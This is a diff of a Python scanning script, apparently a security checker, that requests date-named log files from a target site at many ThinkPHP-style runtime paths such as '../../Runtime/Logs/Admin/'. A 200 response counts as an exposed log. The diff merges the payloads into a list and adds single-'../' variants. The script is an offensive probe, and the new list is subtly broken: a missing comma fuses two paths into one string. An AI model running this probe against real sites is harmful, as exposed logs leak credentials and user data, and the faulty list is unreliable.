@@ -9,7 +9,6 @@ headers = {
     'Accept': 'application/json, text/plain, */*',
     'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
     'Accept-Encoding': 'gzip, deflate',
-    'Content-Type': 'application/x-www-form-urlencoded',
     'Connection': 'close'
     }
 
@@ -25,24 +24,36 @@ def check(url):
 
     # payload 
     filename = time.strftime("%Y%m/%d", time.localtime())
-    payload1 = f"../../runtime/log/{filename}.log"
-    payload2 = f"../../Home/Temp/log/{filename}.log"
-    payload3 = f"../../runtime/index/log/{filename}.log"
-    payload4 = f"../../runtime/admin/log/{filename}.log"
-    
-    filename = time.strftime("%Y_%m_%d", time.localtime())
-    payload5 = f"../../Temp/Logs/{filename}.log"
-    payload6 = f"../../Runtime/Logs/Home/{filename}.log"
-    payload7 = f"../../Runtime/Logs/{filename}.log"
-    payload8 = f"../../Runtime/Logs/Common/{filename}.log"
-    payload9 = f"../../Application/Runtime/Logs/Common/{filename}.log"
-    payload10 = f"../../Application/Runtime/Logs/Home/{filename}.log"
-    payload11 = f"../../Application/Runtime/Logs/Admin/{filename}.log"
-    payload12 = f"../../App/Runtime/Logs/Home/{filename}.log"
+    filename2 = time.strftime("%Y_%m_%d", time.localtime())
+    payloads = [
+            f"../../runtime/log/{filename}.log",
+            f"../../Home/Temp/log/{filename}.log",
+            f"../../runtime/index/log/{filename}.log",
+            f"../../runtime/admin/log/{filename}.log",
+            f"../runtime/log/{filename}.log",
+            f"../Home/Temp/log/{filename}.log",
+            f"../runtime/index/log/{filename}.log",
+            f"../runtime/admin/log/{filename}.log",
+            f"../../Temp/Logs/{filename2}.log",
+            f"../../Runtime/Logs/Home/{filename2}.log",
+            f"../../Runtime/Logs/{filename2}.log",
+            f"../../Runtime/Logs/Common/{filename2}.log",
+            f"../../Application/Runtime/Logs/Common/{filename2}.log",
+            f"../../Application/Runtime/Logs/Home/{filename2}.log",
+            f"../../Application/Runtime/Logs/Admin/{filename2}.log",
+            f"../../App/Runtime/Logs/Home/{filename2}.log"
+            f"../Temp/Logs/{filename2}.log",
+            f"../Runtime/Logs/Home/{filename2}.log",
+            f"../Runtime/Logs/{filename2}.log",
+            f"../Runtime/Logs/Common/{filename2}.log",
+            f"../Application/Runtime/Logs/Common/{filename2}.log",
+            f"../Application/Runtime/Logs/Home/{filename2}.log",
+            f"../Application/Runtime/Logs/Admin/{filename2}.log",
+            f"../App/Runtime/Logs/Home/{filename2}.log"
+        ]
 
     try:
-
-        for payload in (payload1, payload2, payload3, payload4, payload5, payload6, payload7, payload8, payload9, payload10, payload11, payload12):
+        for payload in payloads:
             # print(url + ' ' + payload)
             r = requests.get(url + payload, headers=headers)
             if r.status_code == 200:
